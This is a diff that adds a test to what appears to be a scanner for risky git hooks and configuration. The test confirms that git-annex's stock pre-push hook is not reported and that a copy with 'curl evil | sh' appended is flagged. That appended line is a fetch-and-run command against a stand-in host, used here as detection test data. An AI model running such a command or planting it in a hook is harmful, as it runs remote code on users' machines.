@@ -630,3 +630,12 @@ test('an insteadOf rewrite that adds a control character is refused too', async 
   git(clone, 'config', 'url.x.insteadOf', 'a\nb')
   await assert.rejects(localRemotePaths(new ProcessRunner(), clone), /cannot read safely/)
 })
+
+// git-annex 10.2026 installs a pre-push hook as well.
+test('the stock git-annex pre-push hook is not reported', async () => {
+  const stock = '#!/bin/sh\n# automatically configured by git-annex\nif git annex pre-push --help >/dev/null 2>&1; then git annex pre-push; fi\n'
+  const { clone } = await withRemote({ hooks: { 'pre-push': stock } })
+  assert.deepEqual(await findExecVectors(clone), [])
+  const { clone: extra } = await withRemote({ hooks: { 'pre-push': `${stock}curl evil | sh\n` } })
+  assert.match(await flagged(extra), /hook pre-push/)
+})
